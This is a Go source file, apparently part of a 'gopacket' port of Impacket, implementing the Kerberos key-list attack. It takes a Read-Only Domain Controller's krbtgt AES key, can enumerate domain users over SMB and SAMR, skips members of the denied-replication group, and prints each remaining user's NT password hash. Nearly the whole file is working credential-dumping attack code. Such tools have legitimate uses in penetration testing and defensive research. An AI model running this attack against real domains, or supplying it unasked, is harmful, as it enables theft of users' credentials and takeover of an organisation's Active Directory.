// SPDX-License-Identifier: Apache-2.0

package main

import (
	"bufio"
	"encoding/binary"
	"flag"
	"fmt"
	"os"
	"strings"

	"gopacket/internal/build"
	"gopacket/pkg/dcerpc"
	"gopacket/pkg/dcerpc/samr"
	"gopacket/pkg/flags"
	"gopacket/pkg/kerberos"
	"gopacket/pkg/session"
	"gopacket/pkg/smb"
)

var (
	rodcNo     = flag.Int("rodcNo", 0, "Number of the RODC krbtgt account (e.g., 20000 for krbtgt_20000)")
	rodcKey    = flag.String("rodcKey", "", "AES256 key of the Read Only Domain Controller")
	targetUser = flag.String("t", "", "Attack only the username specified (LIST mode)")
	targetFile = flag.String("tf", "", "File that contains a list of target usernames (LIST mode)")
	domainFlag = flag.String("domain", "", "The fully qualified domain name (LIST mode)")
	kdcHost    = flag.String("kdc", "", "KDC HostName or FQDN (LIST mode)")
	full       = flag.Bool("full", false, "Run the attack against all domain users (noisy!)")
)

func main() {
	flag.Usage = usage
	opts := flags.Parse()

	if opts.Debug {
		build.Debug = true
	}

	// Validate required parameters
	if *rodcNo == 0 {
		fmt.Fprintln(os.Stderr, "[-] You must specify the RODC number (-rodcNo)")
		os.Exit(1)
	}
	if *rodcKey == "" {
		fmt.Fprintln(os.Stderr, "[-] You must specify the RODC AES key (-rodcKey)")
		os.Exit(1)
	}

	if opts.TargetStr == "" {
		usage()
		os.Exit(1)
	}

	// Determine mode: LIST or SMB enumeration
	if strings.ToUpper(opts.TargetStr) == "LIST" {
		runListMode(opts)
	} else {
		runSMBEnumMode(opts)
	}
}

func usage() {
	fmt.Fprintf(os.Stderr, `gopacket v0.1.0 - keylistattack

Performs the KERB-KEY-LIST-REQ attack to dump secrets from the remote machine
without executing any agent there.

If SMB credentials are supplied, the script starts by enumerating the domain
users via SAMR. Otherwise, the attack is executed against the specified targets.

Usage:
  keylistattack [[domain/]username[:password]@]<KDC HostName or IP> [options]
  keylistattack LIST -kdc <KDC> -domain <domain> [options]

Examples:
  # SMB enumeration mode (enumerate users from domain)
  keylistattack contoso.com/jdoe:pass@dc01 -rodcNo 20000 -rodcKey <aesKey>
  keylistattack contoso.com/jdoe:pass@dc01 -rodcNo 20000 -rodcKey <aesKey> -full

  # LIST mode (use target file or specific user)
  keylistattack LIST -kdc dc01.contoso.com -t victim -rodcNo 20000 -rodcKey <aesKey>
  keylistattack LIST -kdc dc01 -domain contoso.com -tf targetfile.txt -rodcNo 20000 -rodcKey <aesKey>

Target:
  [[domain/]username[:password]@]<KDC HostName or IP>
  or "LIST" to use -t/-tf for targets

Options:
`)
	flag.PrintDefaults()
}

func runListMode(opts *flags.Options) {
	// Validate LIST mode parameters
	if *kdcHost == "" {
		fmt.Fprintln(os.Stderr, "[-] You must specify the KDC HostName or FQDN (-kdc)")
		os.Exit(1)
	}

	domainName := *domainFlag
	// Extract domain from KDC FQDN if not specified
	if domainName == "" {
		if strings.Contains(*kdcHost, ".") {
			parts := strings.SplitN(*kdcHost, ".", 2)
			domainName = parts[1]
		} else {
			fmt.Fprintln(os.Stderr, "[-] You must specify a target domain (-domain) or use FQDN for -kdc")
			os.Exit(1)
		}
	}

	// Get target list
	var targets []string
	if *targetUser != "" {
		targets = append(targets, *targetUser+":N/A")
	} else if *targetFile != "" {
		file, err := os.Open(*targetFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Could not open file: %s - %v\n", *targetFile, err)
			os.Exit(1)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" && !strings.HasPrefix(line, "#") {
				if !strings.Contains(line, ":") {
					line = line + ":N/A"
				}
				targets = append(targets, line)
			}
		}

		if len(targets) == 0 {
			fmt.Fprintln(os.Stderr, "[-] No valid targets specified in file")
			os.Exit(1)
		}
	} else {
		fmt.Fprintln(os.Stderr, "[-] You must specify a target username (-t) or targets file (-tf)")
		os.Exit(1)
	}

	// Determine KDC IP
	kdc := opts.DcIP
	if kdc == "" {
		kdc = opts.TargetIP
	}
	if kdc == "" {
		kdc = *kdcHost
	}

	fmt.Println("[*] Using target users provided by parameter")
	runKeyListAttack(domainName, kdc, *rodcNo, *rodcKey, targets)
}

func runSMBEnumMode(opts *flags.Options) {
	// Parse target string: [[domain/]username[:password]@]<KDC>
	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Invalid target: %v\n", err)
		os.Exit(1)
	}

	opts.ApplyToSession(&target, &creds)

	if target.Host == "" {
		fmt.Fprintln(os.Stderr, "[-] You must specify the KDC HostName or IP Address")
		os.Exit(1)
	}

	if creds.Domain == "" {
		fmt.Fprintln(os.Stderr, "[-] You must specify a target domain")
		os.Exit(1)
	}

	if creds.Username == "" {
		fmt.Fprintln(os.Stderr, "[-] You must specify a username")
		os.Exit(1)
	}

	// Prompt for password if needed
	if creds.Password == "" && creds.Hash == "" && creds.AESKey == "" && !opts.NoPass && !opts.Kerberos {
		fmt.Print("Password: ")
		fmt.Scanln(&creds.Password)
	}

	// Determine target IP
	remoteHost := opts.TargetIP
	if remoteHost == "" {
		remoteHost = target.Host
	}
	target.Host = remoteHost

	if target.Port == 0 {
		target.Port = 445
	}

	// Connect via SMB and enumerate users
	fmt.Println("[*] Connecting via SMB to enumerate domain users")

	smbClient := smb.NewClient(target, &creds)
	if err := smbClient.Connect(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] SMB connection failed: %v\n", err)
		os.Exit(1)
	}
	defer smbClient.Close()
	fmt.Println("[+] SMB session established.")

	// Get SMB session key for SAMR
	sessionKey := smbClient.GetSessionKey()
	if len(sessionKey) == 0 {
		fmt.Fprintln(os.Stderr, "[-] Failed to obtain SMB session key")
		os.Exit(1)
	}

	// Connect to SAMR
	samrClient, err := connectSAMR(smbClient, sessionKey, creds.Domain)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to connect to SAMR: %v\n", err)
		os.Exit(1)
	}
	defer samrClient.Close()

	fmt.Println("[*] Enumerating target users. This may take a while on large domains")

	var targets []string
	if *full {
		targets, err = getAllDomainUsers(samrClient)
	} else {
		targets, err = getAllowedUsersToReplicate(samrClient)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to enumerate users: %v\n", err)
		os.Exit(1)
	}

	if len(targets) == 0 {
		fmt.Println("[*] No eligible users found")
		return
	}

	fmt.Printf("[*] Found %d users to target\n", len(targets))

	// The key list TGS-REQ must be sent to the writable DC, not the RODC.
	// The writable DC processes KERB-KEY-LIST-REQ and returns keys.
	// SMB enumeration uses the target (RODC), but Kerberos goes to -dc-ip.
	kdc := opts.DcIP
	if kdc == "" {
		kdc = remoteHost
	}

	runKeyListAttack(creds.Domain, kdc, *rodcNo, *rodcKey, targets)
}

func runKeyListAttack(domainName, kdcHostAddr string, rodcNoVal int, rodcKeyVal string, targets []string) {
	keyList, err := kerberos.NewKeyListSecrets(domainName, kdcHostAddr, rodcNoVal, rodcKeyVal)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to initialize key list attack: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[*] Dumping Domain Credentials (domain\\uid:[rid]:nthash)")
	fmt.Println("[*] Using the KERB-KEY-LIST request method. Tickets everywhere!")

	for _, userEntry := range targets {
		parts := strings.SplitN(userEntry, ":", 2)
		username := parts[0]
		rid := "N/A"
		if len(parts) > 1 {
			rid = parts[1]
		}

		ntHash, err := keyList.GetUserKey(username)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %s: %v\n", username, err)
			continue
		}

		fmt.Printf("%s\\%s:%s:%s\n", strings.ToLower(domainName), username, rid, ntHash)
	}
}

func connectSAMR(smbClient *smb.Client, sessionKey []byte, domainName string) (*samr.SamrClient, error) {
	// Open SAMR pipe
	pipe, err := smbClient.OpenPipe("samr")
	if err != nil {
		return nil, fmt.Errorf("failed to open SAMR pipe: %v", err)
	}

	// Create RPC client and bind
	rpcClient := dcerpc.NewClient(pipe)
	if err := rpcClient.Bind(samr.UUID, samr.MajorVersion, samr.MinorVersion); err != nil {
		return nil, fmt.Errorf("failed to bind to SAMR: %v", err)
	}
	fmt.Println("[+] SAMR bind successful.")

	// Create SAMR client
	samrClient := samr.NewSamrClient(rpcClient, sessionKey)

	// Connect to SAM server
	if err := samrClient.Connect(); err != nil {
		return nil, fmt.Errorf("failed to connect to SAM: %v", err)
	}

	// Open domain
	if err := samrClient.OpenDomain(domainName); err != nil {
		return nil, fmt.Errorf("failed to open domain: %v", err)
	}

	return samrClient, nil
}

func getAllDomainUsers(samrClient *samr.SamrClient) ([]string, error) {
	// Get users via SAMR enumeration
	// Users not allowed to replicate passwords by default
	deniedUsers := map[uint32]bool{
		500: true, // Administrator
		501: true, // Guest
		502: true, // krbtgt
		503: true, // DefaultAccount
	}

	users, err := samrClient.EnumerateDomainUsers()
	if err != nil {
		return nil, err
	}

	var targets []string
	for _, user := range users {
		if !deniedUsers[user.RID] && !strings.HasPrefix(user.Name, "krbtgt_") {
			targets = append(targets, fmt.Sprintf("%s:%d", user.Name, user.RID))
		}
	}

	return targets, nil
}

func getAllowedUsersToReplicate(samrClient *samr.SamrClient) ([]string, error) {
	// Build denied RID set: start with default denied RIDs
	deniedRIDs := map[uint32]bool{
		500: true, // Administrator
		501: true, // Guest
		502: true, // krbtgt
		503: true, // DefaultAccount
	}

	// "Denied RODC Password Replication Group" (RID 572) is a domain alias,
	// not a Builtin alias. Use the primary domain handle.
	domainHandle := samrClient.GetDomainHandle()

	// Get members of "Denied RODC Password Replication Group" (domain alias RID 572)
	aliasHandle, err := samrClient.OpenAlias(domainHandle, 572)
	if err != nil {
		if build.Debug {
			fmt.Fprintf(os.Stderr, "[!] Could not open Denied Password Replication Group: %v (falling back to -full mode)\n", err)
		}
		return getAllDomainUsers(samrClient)
	}

	memberSIDs, err := samrClient.GetMembersInAlias(aliasHandle)
	if err != nil {
		if build.Debug {
			fmt.Fprintf(os.Stderr, "[!] Could not enumerate denied group members: %v\n", err)
		}
	}

	for _, sid := range memberSIDs {
		if rid := extractRIDFromSID(sid); rid != 0 {
			deniedRIDs[rid] = true
		}
	}

	// Enumerate domain groups and aliases for recursive expansion
	groups, _ := samrClient.EnumerateDomainGroups()
	groupSet := make(map[uint32]bool)
	for _, g := range groups {
		groupSet[g.RID] = true
	}

	aliases, _ := samrClient.EnumerateDomainAliases(domainHandle)
	aliasSet := make(map[uint32]bool)
	for _, a := range aliases {
		aliasSet[a.RID] = true
	}

	// Recursively expand nested groups/aliases in the denied list
	queue := make([]uint32, 0, len(deniedRIDs))
	for rid := range deniedRIDs {
		queue = append(queue, rid)
	}

	for i := 0; i < len(queue); i++ {
		rid := queue[i]

		if groupSet[rid] {
			gh, err := samrClient.OpenGroup(rid)
			if err != nil {
				continue
			}
			memberRIDs, err := samrClient.GetMembersInGroup(gh)
			if err != nil {
				continue
			}
			for _, mrid := range memberRIDs {
				if !deniedRIDs[mrid] {
					deniedRIDs[mrid] = true
					queue = append(queue, mrid)
				}
			}
		} else if aliasSet[rid] {
			ah, err := samrClient.OpenAlias(domainHandle, rid)
			if err != nil {
				continue
			}
			sids, err := samrClient.GetMembersInAlias(ah)
			if err != nil {
				continue
			}
			for _, sid := range sids {
				if mrid := extractRIDFromSID(sid); mrid != 0 && !deniedRIDs[mrid] {
					deniedRIDs[mrid] = true
					queue = append(queue, mrid)
				}
			}
		}
	}

	// Enumerate all domain users and filter out denied ones
	users, err := samrClient.EnumerateDomainUsers()
	if err != nil {
		return nil, err
	}

	var targets []string
	for _, user := range users {
		if !deniedRIDs[user.RID] && !strings.HasPrefix(user.Name, "krbtgt_") {
			targets = append(targets, fmt.Sprintf("%s:%d", user.Name, user.RID))
		}
	}

	return targets, nil
}

// extractRIDFromSID extracts the last SubAuthority (RID) from a raw SID.
func extractRIDFromSID(sid []byte) uint32 {
	if len(sid) < 12 {
		return 0
	}
	subAuthCount := int(sid[1])
	if subAuthCount == 0 {
		return 0
	}
	offset := 8 + (subAuthCount-1)*4
	if offset+4 > len(sid) {
		return 0
	}
	return binary.LittleEndian.Uint32(sid[offset:])
}
